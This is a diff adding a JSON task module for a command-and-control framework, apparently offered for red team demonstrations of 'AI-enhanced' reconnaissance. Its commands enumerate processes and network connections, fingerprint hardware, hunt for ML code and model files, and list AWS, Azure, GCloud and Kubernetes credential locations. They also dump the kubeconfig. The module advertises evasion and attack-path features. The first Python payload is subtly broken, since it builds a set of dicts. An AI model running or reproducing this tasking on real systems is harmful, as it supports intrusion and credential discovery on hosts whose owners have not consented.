@@ -1,0 +1,69 @@
+{
+  "id": "ai_ml_recon",
+  "name": "AI-Powered Intelligence Gathering",
+  "description": "Machine learning-enhanced reconnaissance with automated target profiling, behavior analysis, and predictive vulnerability assessment",
+  "version": "2.0",
+  "author": "SecureComm C2 - AI Division",
+  "category": "ai-ml",
+  "platform": "cross-platform",
+  "risk_level": "medium",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "python3 -c \"import psutil; print({p.info for p in psutil.process_iter(['pid','name','cpu_percent','memory_percent'])}); [psutil.Process(p.info['pid']).connections() for p in psutil.process_iter(['pid','name'])]\"",
+      "description": "ML training data collection - process behavior profiling",
+      "timeout": 120,
+      "ml_analysis": true
+    },
+    {
+      "type": "exec",
+      "payload": "whoami /all 2>/dev/null || id; cat /proc/cpuinfo 2>/dev/null | grep -E 'model name|cpu cores|vendor_id' | head -20; nvidia-smi 2>/dev/null || echo 'No GPU detected'",
+      "description": "Hardware profiling for AI workload assessment",
+      "timeout": 30,
+      "ml_feature": "hardware_fingerprinting"
+    },
+    {
+      "type": "recon",
+      "payload": "ml_behavior_analysis",
+      "description": "Analyze user behavior patterns using ML models",
+      "timeout": 180,
+      "ml_model": "behavior_v3.onnx"
+    },
+    {
+      "type": "exec",
+      "payload": "find /home -name '*.py' -o -name '*.ipynb' -o -name '*.h5' -o -name '*.pkl' -o -name '*.onnx' 2>/dev/null | head -50; ls -la ~/.local/lib/python*/site-packages/ 2>/dev/null | grep -E 'torch|tensorflow|sklearn|transformers'",
+      "description": "AI/ML framework discovery - identify ML development environments",
+      "timeout": 60,
+      "ml_feature": "framework_detection"
+    },
+    {
+      "type": "exec",
+      "payload": "ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ /root/.kube/ 2>/dev/null; cat ~/.aws/config 2>/dev/null | grep -E 'region|output'; kubectl config view --minify 2>/dev/null || echo 'No k8s'",
+      "description": "Cloud and ML platform credential discovery",
+      "timeout": 45,
+      "ml_feature": "cloud_ml_discovery"
+    }
+  ],
+  "ai_capabilities": {
+    "behavior_prediction": true,
+    "vulnerability_scoring": true,
+    "anomaly_detection": true,
+    "target_fingerprinting": true
+  },
+  "ml_models_required": [
+    "behavior_v3.onnx",
+    "vulnerability_scorer.pkl"
+  ],
+  "features": [
+    "automated_target_profiling",
+    "predictive_attack_paths",
+    "ml-based_evasion",
+    "intelligent_pivot_selection"
+  ],
+  "mitre_techniques": ["T1082", "T1083", "T1087", "T1619"],
+  "tags": ["ai-ml", "intelligence", "predictive", "behavior-analysis", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "This template showcases 2026-era AI-enhanced reconnaissance capabilities for red team demonstrations"
+}
